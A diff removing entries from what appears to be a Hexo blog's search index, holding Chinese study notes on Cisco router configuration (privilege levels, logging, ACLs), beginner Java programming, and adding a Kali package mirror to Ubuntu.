-<h3 id="privilege等级介绍"><a href="#privilege等级介绍" class="headerlink" title="privilege等级介绍"></a>privilege等级介绍</h3><h4 id="privilege等级切换"><a href="#privilege等级切换" class="headerlink" title="privilege等级切换"></a>privilege等级切换</h4><ul>
-<li>privilege一共有15个等级，没有enable密码的情况下，不能从低等级切换到高等级，否则会报错<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router1&gt;en 2</span><br><span class="line"> % Error in authentication.</span><br></pre></td></tr></table></figure></li>
-<li>加入需要从en 0切换到en 3 ，需要回到en 15 为en 3 设置一个密码，然后进行切换<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router1&gt;en 15</span><br><span class="line">Router1#configure terminal</span><br><span class="line">router1(config)#enable secret level 3 a  //为en 3 设置密码为a</span><br><span class="line">router1&gt;en 3</span><br><span class="line">Password:</span><br><span class="line">router1#           //不同的级别使用的命令会不一样</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="配置日志服务器"><a href="#配置日志服务器" class="headerlink" title="配置日志服务器"></a>配置日志服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">router1(config)#logging on                 //打开日志服务</span><br><span class="line">router1(config)#logging trap debugging     //设置等级为debugging</span><br><span class="line">router1(config)#logging x.x.x.x           //设置日志服务器地址</span><br><span class="line">router1(config)#service timestamps log datetime  //设置时间戳</span><br></pre></td></tr></table></figure>
-
-<h3 id="路由器配置"><a href="#路由器配置" class="headerlink" title="路由器配置"></a>路由器配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#interface FastEthernet0/0</span><br><span class="line">Router(config-if)#ip address 10.1.1.254 255.255.255.0  //绑定地址</span><br><span class="line">Router(config-if)#no shutdown    //启动接口</span><br><span class="line">Router(config-if)#ip route 目的地址 子网掩码 路由器下一跳      //设置静态路由</span><br></pre></td></tr></table></figure>
-
-<h3 id="ACL配置"><a href="#ACL配置" class="headerlink" title="ACL配置"></a>ACL配置</h3><h4 id="标准ACL"><a href="#标准ACL" class="headerlink" title="标准ACL"></a>标准ACL</h4><ul>
-<li>顺序匹配原则</li>
-<li>标准访问控制列表因为只能限制源IP地址，因此应该把ACL放到离目标最近的端口出方向上。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#access-list 1 deny 192.168.1.1   //拒绝192.168.1.1流量</span><br><span class="line">Router(config)#access-list 1 permit any         //允许任何流量通过</span><br><span class="line">Router(config)#interface fastEthernet 0/1       //进入接口0/1</span><br><span class="line">Router(config-if)#ip access-group 1 out         //设置ACL为出方向</span><br></pre></td></tr></table></figure>
-<h4 id="扩展ACL"><a href="#扩展ACL" class="headerlink" title="扩展ACL"></a>扩展ACL</h4></li>
-<li>扩展ACL可以对数据包中的源、目标IP地址以及端口号进行检查，所以可以将该ACL放置在通信路径中的任一位置。但是，如果放到离目标近的地方，每台路由器都要对数据进行处理，会更多的消耗路由器和带宽资源。放到离源最近的路由器端口入方向直接就将拒绝数据丢弃，可以减少其他路由器的资源占用以及带宽占用。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#access-list 100 deny tcp host 192.168.1.1 host 172.20.1.1 eq www   //拒绝从192.168.1.1发到172.20.1.1的tcp协议，端口为80</span><br><span class="line">Router(config)#access-list 100 permit ip any any   //允许任何流量</span><br><span class="line">Router(config)#interface fastEthernet 0/0   //设置接口为0/0</span><br><span class="line">Router(config-if)#ip access-group 100 in    //设置ACL为入方向</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>cisco</tag>
-        <tag>路由器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>java学习笔记</title>
-    <url>/2022/08/03/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> hello_world;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> datademo1;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">datatype1</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//byte：8位，最大存储数据量是255，存放的数据范围是-128~127之间。</span></span><br><span class="line">		<span class="comment">//short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。</span></span><br><span class="line">		<span class="comment">//int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。</span></span><br><span class="line">		<span class="comment">//long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。</span></span><br><span class="line">		<span class="comment">//float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。</span></span><br><span class="line">		<span class="comment">//double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。</span></span><br><span class="line">		<span class="comment">//boolean：只有true和false两个取值。</span></span><br><span class="line">		<span class="comment">//char：16位，存储Unicode码，用单引号赋值。</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">byte</span> a =<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">		<span class="keyword">short</span> b = <span class="number">32767</span>;</span><br><span class="line">		<span class="keyword">int</span> c=<span class="number">234441</span>;</span><br><span class="line">		<span class="comment">//数字后加L</span></span><br><span class="line">		<span class="keyword">long</span> d=<span class="number">45646645546546L</span>;</span><br><span class="line">		<span class="comment">//数字后加F</span></span><br><span class="line">		<span class="keyword">float</span> e=<span class="number">3.2f</span>;</span><br><span class="line">		<span class="keyword">double</span> f=<span class="number">52.2</span>;</span><br><span class="line">		<span class="keyword">boolean</span> g=<span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">char</span> h=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="键盘输入-整数"><a href="#键盘输入-整数" class="headerlink" title="键盘输入(整数)"></a>键盘输入(整数)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> input;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner sc  = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> i = sc.nextInt();</span><br><span class="line">		System.out.print(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">				<span class="comment">//定义数组</span></span><br><span class="line">        <span class="keyword">int</span> [] a =<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[I@119d7047</span></span><br><span class="line"><span class="comment">[表示数组</span></span><br><span class="line"><span class="comment">I表示类型int</span></span><br><span class="line"><span class="comment">@表示间隔符，固定格式</span></span><br><span class="line"><span class="comment">119d7047真正的地址值</span></span><br><span class="line"><span class="comment">变量可覆盖</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<h4 id="数组长度"><a href="#数组长度" class="headerlink" title="数组长度"></a>数组长度</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [] a =<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            System.out.println(a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//数组名.length得出数组长度</span></span><br></pre></td></tr></table></figure>
-<h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] a = <span class="keyword">new</span> String[<span class="number">100</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">整数类型初始化为0</span></span><br><span class="line"><span class="comment">小数类型初始化为0.0</span></span><br><span class="line"><span class="comment">字符类型初始化为&#x27;\u0000&#x27;</span></span><br><span class="line"><span class="comment">布尔类型 false</span></span><br><span class="line"><span class="comment">引用类型 null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a =<span class="number">10</span>;</span><br><span class="line">        System.out.println(test(a));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num&gt;<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">类型不同，个数不同，顺序不同</span></span><br><span class="line"><span class="comment">同一个类中</span></span><br><span class="line"><span class="comment">与返回值类型无关</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(add(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">        System.out.println(add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul>
-<li>一个java文件中可以定义多个class，但只能一个类是public，public的类名称必须和文件名相同，实际开发中建议一个文件定义一个类<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3></li>
-<li>对象代表什么，就得封装对应的数据，并提供数据对应的行为</li>
-</ul>
-<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">        FileOutputStream fop = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        <span class="comment">// 构建FileOutputStream对象,文件不存在会自动新建</span></span><br><span class="line">        OutputStreamWriter writer = <span class="keyword">new</span> OutputStreamWriter(fop, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 构建OutputStreamWriter对象,参数可以指定编码,默认为操作系统默认编码,windows上是gbk</span></span><br><span class="line">        writer.append(<span class="string">&quot;中文输入&quot;</span>);</span><br><span class="line">        <span class="comment">// 写入到缓冲区</span></span><br><span class="line">        writer.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 换行</span></span><br><span class="line">        writer.append(<span class="string">&quot;English&quot;</span>);</span><br><span class="line">        <span class="comment">// 刷新缓存冲,写入到文件,如果下面已经没有写入的内容了,直接close也会写入</span></span><br><span class="line">        writer.close();</span><br><span class="line">        <span class="comment">// 关闭写入流,同时会把缓冲区内容写入文件,所以上面的注释掉</span></span><br><span class="line">        fop.close();</span><br><span class="line">        <span class="comment">// 关闭输出流,释放系统资源</span></span><br><span class="line">        FileInputStream fip = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line">        <span class="comment">// 构建FileInputStream对象</span></span><br><span class="line">        InputStreamReader reader = <span class="keyword">new</span> InputStreamReader(fip, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 构建InputStreamReader对象,编码与写入相同</span></span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">while</span> (reader.ready()) &#123;</span><br><span class="line">            sb.append((<span class="keyword">char</span>) reader.read());</span><br><span class="line">            <span class="comment">// 转成char加到StringBuffer对象中</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">        reader.close();</span><br><span class="line">        <span class="comment">// 关闭读取流</span></span><br><span class="line"></span><br><span class="line">        fip.close();</span><br><span class="line">        <span class="comment">// 关闭输入流,释放系统资源</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String dirname = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line">        File f1 = <span class="keyword">new</span> File(dirname);</span><br><span class="line">        <span class="keyword">if</span> (f1.isDirectory()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;目录 &quot;</span> + dirname);</span><br><span class="line">            String s[] = f1.list();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">                File f = <span class="keyword">new</span> File(dirname + <span class="string">&quot;/&quot;</span> + s[i]);</span><br><span class="line">                <span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">                    System.out.println(s[i] + <span class="string">&quot; 是一个目录&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(s[i] + <span class="string">&quot; 是一个文件&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(dirname + <span class="string">&quot; 不是一个目录&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.oxchang.ui;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GameJFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">GameJFrame</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 设置大小</span></span><br><span class="line">		<span class="keyword">this</span>.setSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">		<span class="comment">// 设置标题</span></span><br><span class="line">		<span class="keyword">this</span>.setTitle(<span class="string">&quot;拼图游戏&quot;</span>);</span><br><span class="line">		<span class="comment">// 设置是否显示</span></span><br><span class="line">		<span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ubuntu添加kali源</title>
-    <url>/2022/09/11/ubuntu%E6%B7%BB%E5%8A%A0kali%E6%BA%90/</url>
-    <content><![CDATA[<h3 id="原博客"><a href="#原博客" class="headerlink" title="原博客"></a>原博客</h3><p><a href="https://www.cnblogs.com/liyilong/p/13789586.html">https://www.cnblogs.com/liyilong/p/13789586.html</a></p>
-<h3 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
-
-<h3 id="设置公钥"><a href="#设置公钥" class="headerlink" title="设置公钥"></a>设置公钥</h3><ol>
-<li><p>方法一</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv ED444FF07D8D0BF6</span><br></pre></td></tr></table></figure></li>
-<li><p>方法二</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gpg --keyserver hkp://keyserver.ubuntu.com:11371 --recv-keys ED444FF07D8D0BF6</span><br><span class="line">gpg --export --armor ED444FF07D8D0BF6 |apt-key add -</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
   </entry>
 </search>
